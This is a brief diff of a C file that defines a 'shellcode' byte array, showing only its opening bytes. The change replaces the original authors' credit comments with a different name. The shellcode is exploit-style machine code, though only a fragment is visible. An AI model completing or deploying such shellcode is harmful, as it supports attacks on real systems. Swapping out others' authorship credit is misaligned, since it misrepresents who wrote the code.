@@ -1,8 +1,7 @@
 #include <stdio.h>
 #include <string.h>
 
-/*by:@lizard2h*/
-/*thanks to k3nsh1n*/
+/*by:bod4k*/
 
 unsigned const char shellcode[]=
 	"\x31\xc0\x31\xdb\x31\xc9\x66\xbb\x68\x64"
